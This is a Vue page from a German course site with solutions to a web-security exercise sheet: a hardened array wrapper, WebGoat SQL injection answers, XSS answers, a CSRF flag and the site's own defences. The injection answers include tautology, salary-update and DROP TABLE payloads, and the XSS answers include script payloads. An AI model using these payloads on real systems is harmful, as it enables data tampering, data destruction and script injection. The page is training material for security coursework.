<template>
  <ExercisePage :exercise-id="12">
    <Exercise title="12.1 Sicherer Array-Wrapper">
      <Question>Ursachenanalyse</Question>
      <Answer>
        Der Exploit ist möglich, da der ArrayWrapper alle Datentypen akzeptiert. Dadurch können nicht nur Number oder
        String Values hinzugefügt werden, sondern auch Funktionen. Zudem erfolgt bei der set Methode keine Überprüfung,
        ob der angegebene Index eine Zahl ist.
      </Answer>

      <Question>Sicherheitskonzept</Question>
      <Answer>
        Entsprechend der Analyse kann der ArrayWrapper wie folgt gesichert werden:
        (1) Prüfung auf undefined bzw. null in der set() Methode und
        (2) Prüfung auf den Datentypen in der set() Methode, sodass keine Funktionen erlaubt sind und als Index nur
        Zahlen.
      </Answer>

      <Question>Array-Wrapper Implementierung</Question>
      <CodeSnippet lang="js">
        function arrayWrapper() {
          let array = [];

          return {
            get: index => {
              return array[index];
            },

            set: (index, value) => {
              if (typeof index !== 'number' || !['string', 'number'].includes(typeof value)) {
                return;
              }
              array[index] = value;
            },

            append: value => {
              array.push(value);
            }
          }
        }
      </CodeSnippet>
    </Exercise>

    <Exercise title="12.2 WebGoat Injection">
      <Question>Lösungen</Question>
      <Answer>
        <CodeSnippet lang="sql">
          SELECT department FROM employees WHERE userid = 96134;

          UPDATE employees SET department = 'Sales' WHERE userid = 96134;

          ALTER TABLE employees ADD phone varchar(20);

          GRANT ALL ON grant_rights TO unauthorized_user;

          SELECT * FROM user_data WHERE first_name = 'John' AND last_name = 'Smith' OR '1' = '1
        </CodeSnippet>

        <div>
          Login_Count: 0 <br>
          User_Id: 0 OR TRUE <br><br>

          Employee Name: Smith <br>
          TAN: 3SL99A' OR '1' = '1 <br><br>

          Employee Name: Smith
        </div>

        <CodeSnippet lang="sql">
          TAN: 3SL99A'; UPDATE employees SET salary = 100000 where userid = '37648

          SELECT'; DROP TABLE access_log; SELECT * FROM access_log WHERE Action like '
        </CodeSnippet>
      </Answer>
    </Exercise>

    <Exercise title="12.3 WebGoat XSS">
      <Question>Lösungen</Question>
      <Answer>
        Yes <br><br>

        Credit card number field: &lt;script&gt;alert()&lt;/script&gt; <br><br>

        start.mvc#test <br><br>

        start.mvc#test/%3Cscript%3Ewebgoat.customjs.phoneHome%28%29%3C%2Fscript%3E <br>
        Output: -1248632573
      </Answer>
    </Exercise>

    <Exercise title="12.4. WebGoat Cross-Site Request Forgeries">
      <Question>Lösungen</Question>
      <Answer>
        38105
      </Answer>
    </Exercise>

    <Exercise title="12.5 Sicherheitskonzepte für die eigene Homepage">
      <div>
        Folgende Maßnahmen wurden getroffen, um die Homepage abzusichern.
      </div>

      <Question>TLS-Verschlüsselung</Question>
      <Answer>
        Die Webseite wird mithilfe von Netlify deployed. Dort wird jede Seite standardmäßig per TLS abgesichert,
        sodass jeglicher Datenaustausch über die Seite verschlüsselt wird. Ein Abfangen von Klardaten (z.B. aus dem
        Feedback-Form ist somit nicht möglich.
      </Answer>

      <Question>HTML-Escaping</Question>
      <Answer>
        Die Seite wurde mithilfe von NuxtJS erstellt, was VueJS als darunterliegendes Framework nutzt. Bei VueJS
        wird standardmäßig jeglicher Inhalt HTML-escaped. Das heißt, alle Eingaben, die z.B. in Input-Felder getätigt
        werden und dann auf der Seite gerendert werden, werden escaped. Ein Ausführen von Script-Blöcken ist somit
        nicht möglich.
      </Answer>

      <Question>Escaping des ausgehenden Verkehrs</Question>
      <Answer>
        Wird z.B. eine neue Nachricht über das Feedback-Form eingereicht, wird diese an Netlify weitergeleitet
        (
        <CustomAnchor target="_blank" href="https://www.netlify.com/products/forms/">Netlify Forms</CustomAnchor>
        ).
        Neben einem Honeypot-Feld werden die Daten zudem anschließend durch Akismet auf Spam untersucht und automatisch
        aussortiert. <br>
        Die Daten, die letztendlich auf dem Server gespeichert werden, werden durch Netlify entsprechend gespeichert,
        sodass dort kein Ausführen von z.B. SQL-Ausdrücken möglich ist.
      </Answer>

      <Question>CORS, XSS etc.</Question>
      <Answer>
        Da - abseits von dem Feedback-Form - keinerlei Nutzerinteraktion bzgl. Datenverarbeitung möglich ist, bedarf
        es hier keinen zusätzlichen Sicherheitsmaßnahmen. Auch Nutzeridentifiaktionen, wie Cookies, werden nicht
        verwendet und müssen somit nicht geschützt werden.
      </Answer>
    </Exercise>
  </ExercisePage>
</template>

<script lang="ts">
import {defineComponent} from '@nuxtjs/composition-api';
import ExercisePage from '~/components/ExercisePage.vue';
import Exercise from '~/components/Exercise.vue';
import Title from '~/components/Title.vue';
import Question from '~/components/Question.vue';
import Answer from '~/components/Answer.vue';
import CustomAnchor from '~/components/CustomAnchor.vue';
import CodeSnippet from '~/components/CodeSnippet.vue';

export default defineComponent({
  components: {CodeSnippet, CustomAnchor, Answer, Question, Title, Exercise, ExercisePage}
});
</script>
